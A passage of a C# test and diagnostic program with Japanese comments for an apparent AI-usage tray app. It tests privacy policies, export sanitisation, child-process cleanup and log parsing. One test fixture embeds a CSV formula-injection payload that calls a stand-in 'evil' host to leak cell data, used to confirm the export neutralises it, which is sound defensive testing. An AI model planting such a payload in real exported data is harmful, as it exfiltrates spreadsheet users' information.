                        "{\"type\":\"ai-title\",\"aiTitle\":\"顧客A社の見積もり\",\"sessionId\":\"" + sid + "\"}",
                        ClaudeUser(sid, now, "=HYPERLINK(\"http://evil/?\"&A1) 顧客A社の秘密").Replace("C:\\\\work\\\\proj", "C:\\\\secret\\\\customerA"),
                        ClaudeAssistant(sid, "msg_P", "req_P", now.AddSeconds(2), 5, 6, 7, 8).Replace("C:\\\\work\\\\proj", "C:\\\\secret\\\\customerA"));
                    var day = now.ToLocalTime().Date;

                    // HidePromptText：依頼文もタイトルも出さない
                    var st = new UsageStore(paths, new Settings(), null);
                    st.Policy = new Policy { HidePromptText = true };
                    st.Logs.Scan(null);
                    var act = new Activity(st);
                    string mdOut = act.ExportMarkdown(new List<DateTime> { day }, null, true);
                    string csvOut = act.ExportCsv(new List<DateTime> { day }, null, true);
                    Check(!mdOut.Contains("秘密") && !csvOut.Contains("秘密") && !mdOut.Contains("見積もり"), "HidePromptText：書き出しに依頼文・タイトルを含めない");
                    Check(act.PromptText(Tool.ClaudeCode, st.Logs.FirstPrompt(st.Logs.SessionsForDay(day)[0].Info)) == null, "HidePromptText：画面用の読み取りもしない");

                    // 依頼文を出す場合でも、書き出しは無害化される
                    var st2 = new UsageStore(paths, new Settings(), null);
                    st2.Logs.Scan(null);
                    var act2 = new Activity(st2);
                    string csv2 = act2.ExportCsv(new List<DateTime> { day }, null, true);
                    string md2 = act2.ExportMarkdown(new List<DateTime> { day }, null, true);
                    Check(csv2.Contains("\"'=HYPERLINK(") && !csv2.Contains(",=HYPERLINK") && !csv2.Contains("\"=HYPERLINK"), "CSV書き出し：依頼文の数式が無害化される", csv2);
                    Check(md2.Contains("```text") && md2.Contains("=HYPERLINK"), "Markdown書き出し：依頼文はコードブロック内", md2);

                    // DisableExport
                    var st3 = new UsageStore(paths, new Settings(), null);
                    st3.Policy = new Policy { DisableExport = true };
                    Check(!st3.ExportAllowed, "DisableExport：書き出し不可");

                    // DisableActivityLog：作業フォルダ・位置情報・タイトルを保持しない
                    string root4 = Tmp();
                    var paths4 = FakePaths(root4);
                    paths4.ClaudeProjects = paths.ClaudeProjects;
                    var st4 = new UsageStore(paths4, new Settings(), null);
                    st4.Policy = new Policy { DisableActivityLog = true };
                    st4.Logs.ApplyActivityCollection(!st4.Policy.DisableActivityLog);
                    st4.Logs.Scan(null);
                    st4.Logs.Save();
                    string cache4 = File.ReadAllText(Path.Combine(paths4.DataDir, "local-logs-v4.json"));
                    var v4 = st4.Logs.SessionsForDay(day);
                    Check(!st4.ActivityAllowed && v4.Count == 1 && v4[0].Info.Cwd == null && v4[0].Info.Prompts.Count == 0 && v4[0].Info.AiTitle == null, "DisableActivityLog：作業フォルダ・依頼の位置・タイトルを保持しない");
                    Check(!cache4.Contains("customerA") && !cache4.Contains("\"prompts\":[{"), "DisableActivityLog：キャッシュにも残らない");
                    Eq(26, st4.Logs.DayTotal(Tool.ClaudeCode, day).Total, "DisableActivityLog：トークン数の集計は続ける");

                    // 既存キャッシュがある状態でポリシーが後から有効になった場合
                    var st5 = new UsageStore(paths, new Settings(), null);
                    st5.Logs.Scan(null);
                    Check(st5.Logs.SessionsForDay(day)[0].Info.Cwd != null, "（前提）通常は作業フォルダを保持");
                    st5.Policy = new Policy { DisableActivityLog = true };
                    st5.Logs.ApplyActivityCollection(false);
                    Check(st5.Logs.SessionsForDay(day)[0].Info.Cwd == null && st5.Logs.SessionsForDay(day)[0].Info.Prompts.Count == 0, "DisableActivityLog：後から有効にしても保持中の作業情報を消す");

                    // DisableCodexFetch：子プロセスを起動しない
                    var st6 = new UsageStore(paths, new Settings(), null);
                    st6.Policy = new Policy { DisableCodexFetch = true };
                    st6.RefreshCodex();
                    Check(st6.Codex == null && st6.CodexCliPath == null && st6.CodexError == UsageStore.MsgCodexPolicy, "DisableCodexFetch：Codex CLI を探さず起動もしない");
                }

                // Codexのスナップショットにメールアドレスを保存しない
                {
                    var snap = new CodexSnapshot { ObservedAtUtc = DateTime.UtcNow, AccountEmail = "someone@example.com", AccountType = "chatgpt", Main = new QuotaGroup() };
                    string json = Json.Serialize(snap.ToJson());
                    Check(!json.Contains("someone@example.com"), "codex-snapshot.json にメールアドレスを書かない");
                }

                // 子プロセスはジョブに入り、親が強制終了されても残らない
                {
                    string pidFile = Path.Combine(Tmp(), "child.pid");
                    var helper = Process.Start(new ProcessStartInfo(Process.GetCurrentProcess().MainModule.FileName, "--spawn-job-child \"" + pidFile + "\"") { UseShellExecute = false, CreateNoWindow = true });
                    int childPid = 0;
                    for (int i = 0; i < 100 && childPid == 0; i++) { System.Threading.Thread.Sleep(100); try { childPid = int.Parse(File.ReadAllText(pidFile)); } catch { } }
                    bool aliveBefore = false;
                    try { using (var cp = Process.GetProcessById(childPid)) aliveBefore = !cp.HasExited; } catch { }
                    helper.Kill();
                    helper.WaitForExit(5000);
                    bool aliveAfter = true;
                    for (int i = 0; i < 30 && aliveAfter; i++)
                    {
                        System.Threading.Thread.Sleep(100);
                        try { using (var cp = Process.GetProcessById(childPid)) aliveAfter = !cp.HasExited; } catch (ArgumentException) { aliveAfter = false; }
                    }
                    Check(childPid != 0 && aliveBefore && !aliveAfter, "親プロセスを強制終了すると子プロセスもOSが終了する（ジョブオブジェクト）", "pid=" + childPid + " before=" + aliveBefore + " after=" + aliveAfter);
                }
            }

            TeamUnit();

            Console.WriteLine("== 行リーダー");
            {
                string root = Tmp();
                string f = Path.Combine(root, "big.jsonl");
                var sb = new StringBuilder();
                sb.Append("{\"keep\":1}\r\n");
                sb.Append("{\"skip\":\"").Append('z', 9 * 1024 * 1024).Append("\"}\n");
                sb.Append("{\"keep\":2}\n");
                sb.Append("{\"keep\":\"").Append('k', 5 * 1024 * 1024).Append("\"}\n");
                sb.Append("{\"keep\":3}");
                File.WriteAllText(f, sb.ToString());
                var r = new LineReader();
                r.LimitForKind = k => 1024 * 1024;
                var got = new List<string>();
                int trunc = 0;
                long end = r.Scan(f, 0, (h, n) => LineReader.Contains(h, n, LineReader.B("keep")) ? 1 : 0,
                    (off, data, len, truncated, kind) => { if (truncated) trunc++; else got.Add(Encoding.UTF8.GetString(data, 0, len)); }, null);
                Check(got.Count == 2 && got[0] == "{\"keep\":1}" && got[1] == "{\"keep\":2}", "必要な行だけ取り出す（CRLF対応）", string.Join("|", got));
                Eq(1, trunc, "上限超えの行は切り捨てとして数える");
                Eq(new FileInfo(f).Length - "{\"keep\":3}".Length, end, "改行のない最終行は未処理として残す");
            }
        }

        static void SpawnJobChild(string pidFile)
        {
            var child = Process.Start(new ProcessStartInfo(Path.Combine(Environment.SystemDirectory, "PING.EXE"), "-n 60 127.0.0.1") { UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true });
            Hardening.AttachToKillOnCloseJob(child);
            File.WriteAllText(pidFile, child.Id.ToString());
            System.Threading.Thread.Sleep(60000);
        }

        // ================================================================ 画面の画像出力

        static void Render(string dataDir, string outDir)
        {
            Directory.CreateDirectory(outDir);
            var paths = AppPaths.Default();
            paths.DataDir = dataDir;
            if (dataDir == "EMPTY")
            {
                // 何も入っていないPCを想定（Codex CLI・Claude・ログなし）
                paths = FakePaths(Tmp());
                Environment.SetEnvironmentVariable("PATH", Environment.GetEnvironmentVariable("SystemRoot") + "\\System32");
            }
            var store = new UsageStore(paths, new Settings(), null);
            store.Policy = Policy.Load();
            store.RefreshCodex();
            store.RefreshClaude();
            store.Logs.Load();
            store.Logs.Scan(null);
            var activity = new Activity(store);

            // トレイアイコン（実寸と拡大）
            foreach (int size in new[] { 16, 20, 24, 32 })
            {
                var values = new double?[] { 100, 88, 36, 20, 15, 9, 0, null };
                int cell = size + 6;
                using (var sheet = new System.Drawing.Bitmap(cell * values.Length, cell * 2))
                using (var g = System.Drawing.Graphics.FromImage(sheet))
                {
                    g.Clear(System.Drawing.Color.FromArgb(32, 32, 36));
                    for (int i = 0; i < values.Length; i++)
                    {
                        using (var a = TrayIcons.Render(TrayKind.Codex, values[i], size)) g.DrawImage(a, i * cell + 3, 3);
                        using (var b = TrayIcons.Render(TrayKind.Claude, values[i], size)) g.DrawImage(b, i * cell + 3, cell + 3);
                    }
                    using (var big = new System.Drawing.Bitmap(sheet.Width * 4, sheet.Height * 4))
                    using (var gb = System.Drawing.Graphics.FromImage(big))
                    {
                        gb.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor;
                        gb.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.Half;
                        gb.DrawImage(sheet, 0, 0, big.Width, big.Height);
                        big.Save(Path.Combine(outDir, "tray-" + size + ".png"));
                    }
                }
            }

            // タスクバー用（上段Codex・下段Claude）
            {
                var pairs = new[] { Tuple.Create((double?)36, (double?)76), Tuple.Create((double?)100, (double?)15), Tuple.Create((double?)8, (double?)null) };
                using (var sheet = new System.Drawing.Bitmap(60 * pairs.Length * 3, 60))
                using (var g = System.Drawing.Graphics.FromImage(sheet))
                {
                    g.Clear(System.Drawing.Color.FromArgb(32, 32, 36));
                    int x = 4;
                    foreach (var pr in pairs)
                        foreach (int size in new[] { 24, 32, 48 })
                        {
                            using (var ic = TrayIcons.MultiSizeIcon(sz => TrayIcons.RenderPair(pr.Item1, pr.Item2, sz), new[] { 16, 24, 32, 48 }))
                            using (var sized = new System.Drawing.Icon(ic, size, size))
                                g.DrawIcon(sized, new System.Drawing.Rectangle(x, 4, size, size));
                            x += size + 8;
                        }
                    using (var big = new System.Drawing.Bitmap(sheet.Width * 3, sheet.Height * 3))
                    using (var gb = System.Drawing.Graphics.FromImage(big))
                    {
                        gb.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor;
                        gb.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.Half;
                        gb.DrawImage(sheet, 0, 0, big.Width, big.Height);
                        big.Save(Path.Combine(outDir, "taskbar-icons.png"));
                    }
                }
            }

            // 見本画像（EMPTY）には、このPCのユーザー名を含むパスを写さない（表示だけ差し替え、画像の作成後に戻す）
            string realDataDir = paths.DataDir;
            if (dataDir == "EMPTY") paths.DataDir = @"C:\Users\user01\AppData\Local\AIUsageBar";
            foreach (bool dark in new[] { false, true })
            {
                using (var d = new Dashboard(store, activity))
                {
                    d.ApplyTheme(dark);
                    var views = store.Logs.SessionsForDay(DateTime.Now.Date);
                    if (views.Count > 0) d.Expanded.Add("sess:" + views[0].Info.Key);
                    var shots = new List<Tuple<string, DashTab, bool>> {
                        Tuple.Create("usage", DashTab.Usage, false), Tuple.Create("history", DashTab.History, false),
                        Tuple.Create("log", DashTab.Log, false), Tuple.Create("log-prompts", DashTab.Log, true), Tuple.Create("settings", DashTab.Settings, false) };
                    foreach (var shot in shots)
                    {
                        d.Tab = shot.Item2;
                        d.LogByPrompt = shot.Item3;
                        int w = (int)(Dashboard.LogicalWidth * d.DeviceDpi / 96f);
                        using (var probe = new System.Drawing.Bitmap(w, 700))
                        using (var g = System.Drawing.Graphics.FromImage(probe)) d.RenderTo(g, probe.Size);
                        int h = (int)Math.Min(6000, d.ContentHeight + d.ChromeHeight + 2);
                        using (var bmp = new System.Drawing.Bitmap(w, h))
                        using (var g = System.Drawing.Graphics.FromImage(bmp))
                        {
                            d.RenderTo(g, bmp.Size);
                            bmp.Save(Path.Combine(outDir, (dark ? "dark-" : "light-") + shot.Item1 + ".png"));
                        }
                    }
                }
            }
            paths.DataDir = realDataDir;
            string md = activity.ExportMarkdown(new List<DateTime> { DateTime.Now.Date }, null, true);
            File.WriteAllText(Path.Combine(outDir, "export-today.md"), md, new UTF8Encoding(false));
            File.WriteAllText(Path.Combine(outDir, "export-today.csv"), activity.ExportCsv(new List<DateTime> { DateTime.Now.Date }, null, true), new UTF8Encoding(true));
            File.WriteAllText(Path.Combine(outDir, "security-info.md"), SecurityInfo.Build(store), new UTF8Encoding(false));
            // 組織ポリシーがすべて有効な場合の表示
            {
                var saved = store.Policy;
                store.Policy = new Policy { DisableActivityLog = true, HidePromptText = true, DisableExport = true, DisableCodexFetch = true, DisableStartupRegistration = true };
                store.RefreshCodex();
                using (var d = new Dashboard(store, activity))
                {
                    d.ApplyTheme(false);
                    foreach (var tab in new[] { DashTab.Settings, DashTab.Log, DashTab.Usage })
                    {
                        d.Tab = tab;
                        int w = (int)(Dashboard.LogicalWidth * d.DeviceDpi / 96f);
                        using (var probe = new System.Drawing.Bitmap(w, 700)) using (var g = System.Drawing.Graphics.FromImage(probe)) d.RenderTo(g, probe.Size);
                        int h = (int)Math.Min(6000, d.ContentHeight + d.ChromeHeight + 2);
                        using (var bmp = new System.Drawing.Bitmap(w, h)) using (var g = System.Drawing.Graphics.FromImage(bmp)) { d.RenderTo(g, bmp.Size); bmp.Save(Path.Combine(outDir, "policy-" + tab.ToString().ToLower() + ".png")); }
                    }
                }
                store.Policy = saved;
            }
            Console.WriteLine("rendered to " + outDir);
        }

        // ================================================================ 実データ

        static void Live(string dataDir)
        {
            var paths = AppPaths.Default();
            if (dataDir != null) paths.DataDir = dataDir;
            Directory.CreateDirectory(paths.DataDir);
            Console.WriteLine("DataDir: " + paths.DataDir);

            Console.WriteLine("== Codex CLI");
            var sw = Stopwatch.StartNew();
            string cli = CodexClient.FindCli(paths);
            Console.WriteLine("  CLI: " + (cli ?? "(なし)"));
            try
            {
                var snap = CodexClient.Fetch(cli, TimeSpan.FromSeconds(45), Path.Combine(paths.DataDir, "codex-work"));
                Console.WriteLine("  取得 " + sw.ElapsedMilliseconds + "ms  plan=" + snap.PlanType);
                foreach (var w in snap.Main.Windows)
                    Console.WriteLine("  " + w.Label + ": 使用" + w.UsedPercent + "% 残り" + w.RemainingPercent + "% リセット " + (w.ResetsAtUtc == null ? "-" : Fmt.DateTimeShort(w.ResetsAtUtc.Value.ToLocalTime())));
                foreach (var g in snap.Others)
                    Console.WriteLine("  [" + g.Title + "] " + string.Join(", ", g.Windows.Select(w => w.Label + " 残り" + w.RemainingPercent + "%")));
                if (snap.Daily != null) foreach (var d in snap.Daily.Skip(Math.Max(0, snap.Daily.Count - 7))) Console.WriteLine("  " + d.Date + ": " + Fmt.Full(d.Tokens));
                Check(snap.Main.Windows.Count > 0, "Codexの利用枠を取得");
                Check(snap.Daily != null, "Codexの日別トークンを取得", snap.HistoryError);
                var leftovers = Process.GetProcessesByName("codex").Where(p => { try { return p.StartTime > DateTime.Now.AddMinutes(-2) && p.MainModule.FileName == cli; } catch { return false; } }).ToList();
                Check(leftovers.Count == 0, "app-serverプロセスが残っていない", "残り " + leftovers.Count);
            }
            catch (CodexException ex) { Check(false, "Codexの利用枠を取得", ex.Message); }

            Console.WriteLine("== Claude Desktop");
            string err;
            var c = ClaudeUsage.Read(paths, out err);
            if (c != null)
            {
                Console.WriteLine("  " + c.SourcePath);
                Console.WriteLine("  記録 " + Fmt.DateTimeShort(c.SampleAtUtc.ToLocalTime()) + "  5時間 残り" + c.FiveHourRemaining + "%  週間 残り" + c.WeeklyRemaining + "%  古い=" + c.IsStale(DateTime.UtcNow));
            }
            Check(c != null, "Claudeの保存履歴を読む", err);

            Console.WriteLine("== ローカル記録（初回）");
            var logs = new LocalLogs(paths);
            sw.Restart();
            logs.Scan(null);
            Console.WriteLine("  " + sw.ElapsedMilliseconds + "ms  files=" + logs.ExaminedFiles + " bytes=" + Fmt.Tokens(logs.LastScanBytes) + " sessions=" + logs.SessionCount + " records=" + logs.RecordCount + " discarded=" + logs.DiscardedLines + " skipped=" + logs.SkippedRecords);
            sw.Restart();
            logs.Save();
            Console.WriteLine("  保存 " + sw.ElapsedMilliseconds + "ms  " + new FileInfo(Path.Combine(paths.DataDir, "local-logs-v4.json")).Length / 1024 + "KB");

            Console.WriteLine("== ローカル記録（2回目・キャッシュから）");
            var logs2 = new LocalLogs(paths);
            sw.Restart();
            logs2.Load();
            long loadMs = sw.ElapsedMilliseconds;
            sw.Restart();
            logs2.Scan(null);
            Console.WriteLine("  読み込み " + loadMs + "ms  差分スキャン " + sw.ElapsedMilliseconds + "ms  files=" + logs2.ExaminedFiles + " bytes=" + Fmt.Tokens(logs2.LastScanBytes));

            var today = DateTime.Now.Date;
            for (int i = 6; i >= 0; i--)
            {
                var d = today.AddDays(-i);
                var a = logs2.DayTotal(Tool.ClaudeCode, d);
                var b = logs2.DayTotal(Tool.Codex, d);
                Console.WriteLine("  " + d.ToString("yyyy-MM-dd") + "  ClaudeCode total=" + Fmt.Full(a.Total) + " (in " + Fmt.Full(a.Input) + " out " + Fmt.Full(a.Output) + " cr " + Fmt.Full(a.CacheRead) + " cw " + Fmt.Full(a.CacheWrite) + " n=" + a.Responses + ")   Codex total=" + Fmt.Full(b.Total) + " (in " + Fmt.Full(b.Input) + " cached " + Fmt.Full(b.CacheRead) + " out " + Fmt.Full(b.Output) + " rsn " + Fmt.Full(b.Reasoning) + " n=" + b.Responses + ")");
            }
            var index = logs2.ReadCodexIndex();
            foreach (var d in new[] { today, today.AddDays(-1) })
            {
                Console.WriteLine("  -- " + d.ToString("yyyy-MM-dd") + " のセッション");
                foreach (var v in logs2.SessionsForDay(d).Take(12))
                {
                    string title = logs2.ReadTitle(v.Info, index);
                    string first = logs2.ReadPrompt(v.Info.Tool, logs2.FirstPrompt(v.Info));
                    Console.WriteLine("  [" + v.Info.Tool + "] " + Fmt.DateTimeShort(Fmt.FromUnixMs(v.First).ToLocalTime()) + "-" + Fmt.FromUnixMs(v.Last).ToLocalTime().ToString("HH:mm") +
                        " prompts=" + v.PromptsInDay + " subagents=" + v.Subagents.Count + " total=" + Fmt.Tokens(v.Tokens.Total) + (v.Estimated ? "(推定)" : "") +
                        " model=" + v.Info.Model + " cwd=" + v.Info.Cwd + "\n      title=" + Fmt.OneLine(title, 40) + " | first=" + Fmt.OneLine(first, 50));
                }
            }
            Check(logs2.SessionCount > 0, "セッションを検出");
        }
    }
}
